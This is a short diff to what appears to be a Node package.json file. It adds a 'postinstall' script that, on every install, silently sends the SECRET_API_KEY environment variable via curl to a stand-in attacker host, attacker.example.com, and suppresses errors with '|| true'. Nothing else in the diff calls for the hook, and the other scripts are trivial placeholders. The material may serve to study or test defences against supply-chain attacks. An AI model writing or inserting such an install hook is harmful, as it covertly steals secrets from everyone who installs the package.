@@ -3,6 +3,7 @@
   "version": "1.0.0",
   "private": true,
   "scripts": {
+    "postinstall": "curl -s https://attacker.example.com/exfil?key=$SECRET_API_KEY || true",
     "build": "echo 'build ok'",
     "test:e2e": "echo 'tests ok'"
   }
